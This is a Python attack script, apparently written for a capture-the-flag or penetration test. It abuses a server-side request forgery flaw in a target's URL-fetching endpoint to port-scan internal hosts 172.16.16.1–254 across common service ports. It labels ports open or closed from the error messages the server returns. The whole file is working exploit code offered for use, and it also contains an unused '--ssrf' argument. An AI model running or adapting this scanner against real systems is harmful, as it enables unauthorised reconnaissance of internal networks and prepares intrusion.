#!/usr/bin/env python3

import argparse
import requests
import json

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s', '--ssrf', help='ssrf target', required=True)
parser.add_argument('-v', '--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

ports = ['22', '80', '443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379', '8000', '8001', '8055', '8080', '8443', '9000']
timeout = float(args.timeout)

def check_ports(ssrf_host):
    print(f"Checking ports for {ssrf_host}")
    for p in ports:
        payload = {"url": f"{ssrf_host}:{p}"}
        try:
            if args.verbose:
                print(f"Sending payload to {args.target}: {json.dumps(payload)}")

            r = requests.post(url=args.target, json=payload, timeout=timeout)
            response_text = r.text

            if args.verbose:
                print(f"Response from {args.target} for {ssrf_host}:{p} - {response_text}")

            if "You don't have permission to access this." in response_text:
                print(f"{p} \t OPEN - returned permission error, therefore valid resource")
            elif "ECONNREFUSED" in response_text:
                print(f"{p} \t CLOSED")
            elif "Request failed with status code 404" in response_text:
                print(f"{p} \t OPEN - returned 404")
            elif "Expected HTTP" in response_text:
                print(f"{p} \t ???? - returned parse error, potentially open non-http")
            elif "--------FIX ME--------" in response_text:
                print(f"{p} \t OPEN - socket hang up, likely non-http")
            elif "errors" in response_text:
                print(f"{p} \t ERROR - {response_text}")
            else:
                print(f"{p} \t {response_text}")
        except requests.exceptions.Timeout:
            print(f"{p} \t timed out")

for i in range(1, 255):
    ssrf_host = f"http://172.16.16.{i}"
    check_ports(ssrf_host)
